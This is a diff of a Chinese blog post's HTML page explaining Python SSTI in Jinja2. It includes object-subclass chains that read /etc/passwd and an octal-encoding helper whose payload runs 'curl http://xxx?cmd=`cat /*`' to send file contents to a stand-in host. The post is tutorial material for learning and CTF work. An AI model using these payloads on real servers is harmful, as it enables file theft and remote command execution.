@@ -16,15 +16,15 @@
   <meta name="author" content="springtime">
   <meta name="keywords" content="">
   
-    <meta name="description" content="REF python SSTI 总结 – View of Thai SecMap - SSTI（jinja2） - Tr0y’s Blog Python 沙箱逃逸的经验总结 - Tr0y’s Blog  简介SSTI全称是Server-Side-Template-Injection(服务器端模板引擎注入)，所谓模板就是用于将后端数据(变量)转变为前端的视觉表现(HTML代码)的一种手段，使用模板引">
+    <meta name="description" content="简介SSTI全称是Server-Side-Template-Injection(服务器端模板引擎注入)，所谓模板就是用于将后端数据(变量)转变为前端的视觉表现(HTML代码)的一种手段，使用模板引擎可以使网站程序实现界面与数据的分离。常见的模板：  python：jinja2、mako、tornado、django php：smarty、twig java：jade、velocity、spring">
 <meta property="og:type" content="article">
 <meta property="og:title" content="python SSTI">
 <meta property="og:url" content="http://example.com/2023/05/09/python%20SSTI/index.html">
 <meta property="og:site_name" content="spring&#39;s blog">
-<meta property="og:description" content="REF python SSTI 总结 – View of Thai SecMap - SSTI（jinja2） - Tr0y’s Blog Python 沙箱逃逸的经验总结 - Tr0y’s Blog  简介SSTI全称是Server-Side-Template-Injection(服务器端模板引擎注入)，所谓模板就是用于将后端数据(变量)转变为前端的视觉表现(HTML代码)的一种手段，使用模板引">
+<meta property="og:description" content="简介SSTI全称是Server-Side-Template-Injection(服务器端模板引擎注入)，所谓模板就是用于将后端数据(变量)转变为前端的视觉表现(HTML代码)的一种手段，使用模板引擎可以使网站程序实现界面与数据的分离。常见的模板：  python：jinja2、mako、tornado、django php：smarty、twig java：jade、velocity、spring">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2023-05-09T09:28:13.000Z">
-<meta property="article:modified_time" content="2023-05-19T01:33:54.552Z">
+<meta property="article:modified_time" content="2023-05-22T11:52:47.100Z">
 <meta property="article:author" content="springtime">
 <meta property="article:tag" content="python安全">
 <meta property="article:tag" content="模板注入">
@@ -258,12 +258,7 @@
             
               <div class="markdown-body">
                 
-                <h1 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h1><ul>
-<li><a target="_blank" rel="noopener" href="https://www.viewofthai.link/2023/01/06/python-ssti-%E6%80%BB%E7%BB%93/">python SSTI 总结 – View of Thai</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2022/04/13/SecMap-SSTI-jinja2/">SecMap - SSTI（jinja2） - Tr0y’s Blog</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">Python 沙箱逃逸的经验总结 - Tr0y’s Blog</a></li>
-</ul>
-<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>SSTI全称是<code>Server-Side-Template-Injection</code>(服务器端模板引擎注入)，所谓模板就是用于将后端数据(变量)转变为前端的视觉表现(HTML代码)的一种手段，使用模板引擎可以使网站程序实现界面与数据的分离。常见的模板：</p>
+                <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>SSTI全称是<code>Server-Side-Template-Injection</code>(服务器端模板引擎注入)，所谓模板就是用于将后端数据(变量)转变为前端的视觉表现(HTML代码)的一种手段，使用模板引擎可以使网站程序实现界面与数据的分离。常见的模板：</p>
 <ul>
 <li><strong>python</strong>：jinja2、mako、tornado、django</li>
 <li><strong>php</strong>：smarty、twig</li>
@@ -340,9 +335,9 @@
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__().index(file) <span class="hljs-comment"># 40</span><br></code></pre></td></tr></table></figure>
 </blockquote>
 <ol>
-<li>注入点–基类obj–基类obj的子类–不带wrapper的子类–<code>__builtins__</code>–获取到file执行文件读写</li>
-<li>注入点–基类obj–基类obj的子类–不带wrapper的子类–<code>__builtins__</code>–获取到eval、exec执行命令</li>
-<li>注入点–基类obj–基类obj的子类–不带wrapper的子类–<code>warnings.catch_warnings</code></li>
+<li>注入点&#x3D;&gt;基类obj&#x3D;&gt;基类obj的子类&#x3D;&gt;不带wrapper的子类&#x3D;&gt;<code>__builtins__</code>&#x3D;&gt;获取到file执行文件读写</li>
+<li>注入点&#x3D;&gt;基类obj&#x3D;&gt;基类obj的子类&#x3D;&gt;不带wrapper的子类&#x3D;&gt;<code>__builtins__</code>&#x3D;&gt;获取到eval、exec执行命令</li>
+<li>注入点&#x3D;&gt;基类obj&#x3D;&gt;基类obj的子类&#x3D;&gt;不带wrapper的子类&#x3D;&gt;<code>warnings.catch_warnings</code></li>
 </ol>
 <h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#通过内置类&#x27;__builtins__&#x27;获取file</span><br><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;file&#x27;</span>](<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read()    <br><br><span class="hljs-comment">#通过基类&#x27;__base__&#x27;获取file</span><br>[].__class__.__base__.__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read() <br><span class="hljs-comment">#将read() 修改为 write() 即为写文件</span><br></code></pre></td></tr></table></figure>
 
@@ -409,7 +404,7 @@
 
 <h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="内置类"><a href="#内置类" class="headerlink" title="内置类"></a>内置类</h2><ul>
 <li><p>python内置类</p>
-<p><code>__class__ 返回调用的参数类型 __bases__ 返回类型列表 __mro__ 此属性是在方法解析期间寻找基类时考虑的类元组 __subclasses__() 返回object的子类 __globals__ 函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价 __dict__ 返回类或对象对应的属性 __init__ 返回类或对象的构造方法 __builtins__ 该模块提供对python 的所有内置标识符的直接访问 __import__ 导入包函数 __getitem__ 对象或者字典获取属性（方法不可以）</code></p>
+<p><code>__class__</code> 返回调用的参数类型<br><code>__bases__</code> 返回类型列表<br><code>__mro__</code> 此属性是在方法解析期间寻找基类时考虑的类元组<br><code>__subclasses__()</code> 返回object的子类<br><code>__globals__</code> 函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价<br><code>__dict__</code> 返回类或对象对应的属性<br><code>__init__</code> 返回类或对象的构造方法<br><code>__builtins__</code> 该模块提供对python 的所有内置标识符的直接访问<br><code>__import__</code> 导入包函数<br><code>__getitem__</code> 对象或者字典获取属性（方法不可以）</p>
 </li>
 <li><p>jinja2内置类</p>
 <p><code>config：flask.Flask.config（类文件导入了os）</code><br><code>request：flask.request</code><br><code>flask.request.referrer.args 伪造referer</code><br><code>flask.request.values.args 适用于post,get</code><br><code>flask.request.args.args 只适用于get 其中a是参数</code><br><code>flask.request.cookies.args</code><br><code>flask.request.headers.args</code><br><code>session：flask.session</code><br><code>g：flask</code></p>
@@ -422,10 +417,13 @@
 </ul>
 <h2 id="常用脚本"><a href="#常用脚本" class="headerlink" title="常用脚本"></a>常用脚本</h2><ol>
 <li><p>字符转八进制</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs py">strr = <span class="hljs-string">&quot;__init__&quot;</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;__init__&quot;</span>,<span class="hljs-string">&quot;__globals__&quot;</span>,<span class="hljs-string">&quot;__getitem__&quot;</span>,<span class="hljs-string">&quot;__builtins__&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;curl http://xxx?cmd=`cat /*`&#x27;).read()&quot;</span>]:<br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> i:<br>        <span class="hljs-comment">#print(str(oct(ord(a))))</span><br>        <span class="hljs-built_in">print</span>(i+<span class="hljs-string">&quot;:&quot;</span>)<br>        flag = flag + <span class="hljs-string">&#x27;\\&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">oct</span>(<span class="hljs-built_in">ord</span>(a)))[<span class="hljs-number">2</span>:]<br><br>    <span class="hljs-built_in">print</span>(flag)<br>    flag = <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure>
-</li>
-<li></li>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs py">strr = <span class="hljs-string">&quot;__init__&quot;</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;__init__&quot;</span>,<span class="hljs-string">&quot;__globals__&quot;</span>,<span class="hljs-string">&quot;__getitem__&quot;</span>,<span class="hljs-string">&quot;__builtins__&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;curl http://xxx?cmd=`cat /*`&#x27;).read()&quot;</span>]:<br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> i:<br>        <span class="hljs-comment">#print(str(oct(ord(a))))</span><br>        <span class="hljs-built_in">print</span>(i+<span class="hljs-string">&quot;:&quot;</span>)<br>        flag = flag + <span class="hljs-string">&#x27;\\&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">oct</span>(<span class="hljs-built_in">ord</span>(a)))[<span class="hljs-number">2</span>:]<br><br>    <span class="hljs-built_in">print</span>(flag)<br>    flag = <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure></li>
 </ol>
+<h1 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://www.viewofthai.link/2023/01/06/python-ssti-%E6%80%BB%E7%BB%93/">python SSTI 总结 – View of Thai</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2022/04/13/SecMap-SSTI-jinja2/">SecMap - SSTI（jinja2） - Tr0y’s Blog</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">Python 沙箱逃逸的经验总结 - Tr0y’s Blog</a></li>
+</ul>
 
                 
               </div>
